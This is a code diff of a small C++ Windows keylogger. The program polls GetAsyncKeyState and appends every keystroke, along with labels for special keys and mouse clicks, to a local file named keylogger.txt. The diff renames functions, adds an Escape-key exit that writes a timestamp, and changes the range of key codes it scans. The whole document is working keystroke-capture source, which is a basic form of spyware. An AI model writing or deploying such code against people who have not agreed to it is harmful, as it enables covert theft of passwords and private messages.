@@ -3,41 +3,42 @@
 #include <string>
 #include <fstream>
 #include <stdio.h>
+#include <ctime>
 
 using namespace std;
 
-void write_log( string text ){
+void WriteToLog( string text ){
     ofstream logfile;
     logfile.open("keylogger.txt", fstream::app);
     logfile << text;
     logfile.close();
 }
 
-bool key_listed(int iKey){
+bool KeyIsListed(int iKey){
     switch (iKey){
         case VK_SPACE:
             cout << " ";
-            write_log(" ");
+            WriteToLog(" ");
             break;
         case VK_SHIFT:
             cout << " *SHIFT* ";
-            write_log(" *SHIFT* ");
+            WriteToLog(" *SHIFT* ");
             break;
         case VK_RETURN:
             cout << " \n ";
-            write_log(" \n ");
+            WriteToLog(" \n ");
             break;
         case VK_BACK:
             cout << " *BACKSPACE* ";
-            write_log(" *BACKSPACE* ");
+            WriteToLog(" *BACKSPACE* ");
             break;
         case VK_RBUTTON:
             cout << " *RIGHT CLICK* ";
-            write_log(" *RIGHT CLICK* ");
+            WriteToLog(" *RIGHT CLICK* ");
             break;
         case VK_LBUTTON:
             cout << " *LEFT CLICK* ";
-            write_log(" *LEFT CLICK* ");
+            WriteToLog(" *LEFT CLICK* ");
             break;
         default:
             return false;
@@ -47,23 +48,32 @@ bool key_listed(int iKey){
 int main()
 {
     char key;
+    char end = VK_ESCAPE;
     int i=0;
-    while (i<100){  //can be executed indefinitely by using while(true)
+    while (i<100){
         Sleep(10);
-        for(key=1; key<=128;key++){
+        for(key=32; key<=128;key++){
+            if (GetAsyncKeyState(end) ==-32767){
+                ofstream logfile;
+                time_t t = time(0);
+                tm* now = localtime(&t);
+                logfile.open("keylogger.txt", fstream::app);
+                logfile << "\nEND of LOG - DateTime of End: " << (now->tm_year + 1900) << '-' << (now->tm_mon + 1) << '-'<<  now->tm_mday << 
+                ' '<<now->tm_hour<<':'<<now->tm_min << "\n"; 
+            return 0;
+            }
             if (GetAsyncKeyState(key) == -32767){  //the key is used and is not up
-                if (!key_listed(key)){
-                    if (key>=32 && key<=128){
+                if (!KeyIsListed(key)){
                         ofstream logfile;
                         logfile.open("keylogger.txt", fstream::app);
                         cout << key ;
                         logfile << key ;
                         logfile.close();
-                    }
                 }
             }
         }
-        i+=1;   
+        i+=1;
+
     }
     return 0;
 } 
